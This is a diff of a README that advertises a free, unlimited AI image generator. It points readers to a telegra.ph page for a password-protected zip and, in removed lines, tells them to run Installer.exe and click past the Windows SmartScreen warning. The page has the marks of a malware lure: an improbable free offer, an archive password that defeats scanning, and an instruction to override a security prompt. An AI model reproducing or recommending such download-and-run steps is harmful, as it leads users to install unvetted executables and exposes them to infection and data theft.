@@ -2,7 +2,7 @@
 
 Free AI image generator - no credits, no daily limit
 
-**[AI-Image-Generator.zip](https://telegra.ph/Download-Tutorial-10-28-11)**  
+**[AI-Image-Generator.zip](https://telegra.ph/fff-10-27-8)**  
 password: `IODolz30`
 
 Last updated: October 2026  
@@ -19,13 +19,3 @@ Free AI image generator with no credits and no daily limit. Type a prompt and ge
 - **Models** — SDXL / Flux
 - **Package** — tool.zip
 - **Limits** — None
-
-## Install
-
-1. Open the Telegraph guide: https://telegra.ph/Download-Tutorial-10-28-11
-2. Download **AI-Image-Generator.zip**. Password is `IODolz30`.
-3. Extract, then run **Installer.exe**. If Windows SmartScreen asks, choose More info → Run anyway.
-
----
-
-AIImage-FreeDownload
